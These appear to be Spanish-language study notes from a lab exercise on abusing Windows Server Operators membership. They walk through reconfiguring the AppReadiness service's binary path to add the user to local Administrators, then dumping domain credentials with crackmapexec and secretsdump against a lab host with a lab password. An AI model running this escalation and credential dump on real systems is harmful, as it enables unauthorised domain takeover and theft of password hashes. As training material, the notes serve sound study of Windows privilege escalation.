
Permite a sus miembros administrar servidores Windows sin necesidad de que se le asignen permisos de Domain Admin. Puede iniciar sesion localmente en servidores incluidos DC

Con este grupo se adquieren privilegios como `SeBackupPrivilege` y `SeRestorePrivilege` y la capacidad de controlar los serivicios locales

1. Consultamos un servicio como el servicio AppReadiness y vemos que el servicio AppReadiness se inicia como SYSTEM usando `sc.exe`

```
sc qc AppReadiness
```
![[Pasted image 20260910224303.png]]

2. Comprobamos los permisos del servicio con [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)

```
c:\Tools\PsService.exe security AppReadiness
```
![[Pasted image 20260910224430.png]]
![[Pasted image 20260910224513.png]]

Aqui podemos ver que Server Operators tiene acceso a SERVICE_ALL_ACCESS del servicio AppReadiness

3. Comprobamos la pertenencial al grupo de administradores locales y vemos que nuestro usuario no esta

```
net localgroup Administrators
```
![[Pasted image 20260910224629.png]]

4. Modificamos la ruta del binario del serivicio para ejecutar un comando que añada nuestro usuario actual al grupo de admins

```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```
![[Pasted image 20260910224717.png]]

5. Al tratar de iniciar el servicio falla lo cual es de esperar pero seremos miembros de Administrators

```
sc start AppReadiness
```
![[Pasted image 20260910224750.png]]

```
net localgroup Administrators
```
![[Pasted image 20260910224825.png]]

6. A partir de aqui tendremos acceso total al DC y podremos hacer tareas de postexplotacion como obtener el NTDS.dit

```
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```
![[Pasted image 20260910224930.png]]

```
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```
![[Pasted image 20260910224938.png]]
